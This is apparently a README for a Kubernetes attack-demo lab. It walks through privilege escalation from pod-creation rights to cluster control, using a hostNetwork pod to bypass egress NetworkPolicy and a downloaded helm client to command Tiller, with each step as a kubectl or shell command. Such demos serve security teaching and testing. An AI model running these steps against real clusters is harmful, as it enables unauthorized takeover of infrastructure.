# Privilege escalation 
This scenario demonstrates the potential for privilege escalation and network policy bypass by a malicious insider or compromise of their credentials with the ability to create pods in a namespace leading to full cluster access.

## Demo
[![asciicast](https://asciinema.org/a/293454.svg)](https://asciinema.org/a/293454)

NOTE: This scenario will run container with root access, and it set for demo purposes only. We strongly recommend **NOT RUNNING IT ON A LIVE CLUSTER**

## pre-requisites 
Make sure your cluster is setup following the [instructions here](../env/README.md)

## Lets Hack it

### Setup and install the RBAC and Network policy

1. apply the network policy and RBAC rules 
```console
kubectl apply -f privilege-escalation/daemonset.yaml
```
2. Test the access to the system 
```console
kubectl auth can-i --as demo@example.com create pods -n kube-system
kubectl auth can-i --as demo@example.com create pods -n default
```
### Deploy sample pod to test the access
1. Deploy a simple pod
```console
kubectl --as demo@example.com apply -f privilege-escalation/simplepod.yaml
```
2. Get a shell in the pod:
```console
kubectl --as demo@example.com exec -it simplepod -- /bin/sh
```
3. Attempt to reach tiller directly:
```console 
wget -qO - tiller-deploy.kube-system:44134
exit
```

### Bypass NetworkPolicy

1. Deploy a hostnetwork pod that bypasses network egress policy on the namespace.
```console
kubectl --as demo@example.com apply -f privilege-escalation/hostnetwork.yaml
```
2. Exec in, download the helm client binary and run `helm ls` to show that it can control Tiller.

```console
kubectl --as demo@example.com exec -it hostnetwork -- /bin/sh
```
```console
export PATH=/tmp:$PATH; cd /tmp; wget -qO helm.tar.gz https://get.helm.sh/helm-v2.16.1-linux-amd64.tar.gz; tar zxvf helm.tar.gz; chmod +x linux-amd64/helm; cp linux-amd64/helm .
```
```console
export HELM_HOST=tiller-deploy.kube-system.svc.cluster.local:44134; helm version
exit
```


## Cleanup
To cleanup run 
```console
kubectl delete -f privilege-escalation/
```